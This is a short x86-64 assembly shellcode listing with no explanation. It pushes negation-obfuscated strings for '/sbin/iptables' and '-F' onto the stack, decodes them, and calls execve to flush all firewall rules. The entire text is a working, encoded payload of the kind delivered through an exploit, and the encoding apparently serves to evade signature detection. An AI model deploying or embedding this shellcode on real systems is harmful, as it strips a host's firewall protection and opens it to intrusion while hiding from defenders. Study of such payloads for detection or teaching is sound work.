global _start
section .text
_start:

    xor rax, rax
    cdq
    push rax
    push word 0xb9d3 ; Obfuscated -F
    mov rcx, rsp
    neg word [rcx] ; Deobfuscate -F

    mov rbx,0xffff8c9a939d9e8c
    push rbx
    mov rbx,0x8f96d091969d8cd1
    push rbx
    mov rdi, rsp

    neg qword [rsp]
    neg qword [rsp + 8] ; Deobfuscate /sbin/iptables

    push rax
    push rcx
    push rdi

    mov rsi, rsp

    mov al, 0x3b
    syscall
